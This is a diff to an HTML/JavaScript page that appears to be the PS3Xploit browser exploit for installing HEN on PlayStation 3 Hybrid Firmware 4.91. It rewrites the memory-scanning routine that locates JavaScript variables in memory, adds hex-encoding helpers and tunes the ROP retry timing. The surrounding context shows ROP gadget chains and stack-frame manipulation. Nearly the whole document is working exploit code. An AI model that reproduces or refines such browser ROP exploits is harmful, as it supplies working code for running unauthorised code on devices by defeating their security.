@@ -1,7 +1,7 @@
-<title>Custom Title</title>
+<title>AutoHEN Installer new</title>
 <center>
-<h1><span style='color:blue'>Custom PS3 Installer for HFW</span></h1>
-<hr>
+<h1>AutoHEN Installer for HFW 4.91</h1>
+<hr><span style='color:black'>Thanks to Coro, lmn7, Joonie, evilnat, habib, zecoxao, DeViL303, xps3riments, aldostools, and PS3Xploit Team for their work used or hosted here.</span></h1>
 <div id="result"></div>
 <div id="exploit"></div>
 <div id="trigger" style="display: none;"></div>
@@ -14,6 +14,19 @@ function store_word(store_offset,val,r29out,r30out,r31out)
 	r31out=gtemp_addr;
 	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(store_offset-0xC74)+fill_by_16bytes(0x10,dbyte41)
 	+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+}
+function s2hex(str)
+{
+    var hex = [];
+    var  i = 0;
+    for (;i < str.length; i++) {
+        hex.push(hex16(str.charCodeAt(i).toString(16)));
+    }
+    return hex.join("");
+}
+function hex16(s)
+{
+    return ('0000' + s).slice(-4)
 }
 function stack_frame_swap(new_stack_addr)
 {
@@ -191,7 +204,7 @@ function load_check()
 	if(total_loops<max_loops)
 	{
 		showMsg(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
-		t_out=setTimeout(initROP,150,false);
+		t_out=setTimeout(initROP,100,false);
 	}
 	else
 	{
@@ -200,44 +213,21 @@ function load_check()
 		t_out=0;
 	}
 }
-function findJsVariableOffset(name,exploit_data,base,size)
+function findJsVariableOffset(name,exploit_data,base,size,end)
 {
-	readMemory(base,size);
-	var dat=document.getElementById('exploit').style.src.substr(6,size);
-	var i=0;
-	var t;
-	var k;
-	var match;
-	var exploit_addr;
-	while(i<(dat.length*2))
-	{
-		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
-		{
-			match=0;
-			for (k=0;k<(exploit_data.length*2);k+=0x2)
-			{
-				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2)){break;}
-				match+=1;
-			}
-			if (match===exploit_data.length)
-			{
-				exploit_addr=base+i+4;
-				
-				for(t=0;t<offset_array.length;t+=1)
-				{
-					if(offset_array[t]===exploit_addr)
-					{
-						return -1;
-					}
-				}
-				offset_array.push(exploit_addr);
-				return exploit_addr;
-			}
-		}
-		i+=0x10;
-	}
-	var end_range=base+size;
-	return 0;
+    var block = 0;
+    while((base + block * size) < end)
+    {
+        readMemory(base + block * size, size);
+        var offset = document.getElementById('exploit').style.src.substr(6,size).indexOf(exploit_data);
+        if(offset > 0)
+        {
+            return base + block * size + (offset * 2) + 4;
+        }
+        
+        block++;
+    }
+    return 0;
 }
 function stack_frame_hookup()
 {
@@ -392,7 +382,7 @@ function listener()
 	var myListener = function ()
 	{
 		document.removeEventListener('mousemove', myListener, false);
-		showMsg('<h2>Installing files, please wait...</h2>');
+		showMsg('<h2>Installing HEN, please wait...</h2>');
 		triggerX();
 	};
 	document.addEventListener('mousemove', myListener, false);
@@ -406,7 +396,7 @@ function triggerX()
 }
 function HFWmsg()
 {
-	showMsg("<h2><span style='color:red'>You must install Hybrid Firmware (HFW) 4.91 before using this installer!</h2></span>");
+	showMsg("<h2><span style='color:red'>You must install Hybrid Firmware (HFW) 4.91 before installing HEN!</h2></span>");
 	throw new Error('');
 }
 if(fwv=="4.91"){initROP(true)}else{HFWmsg()}
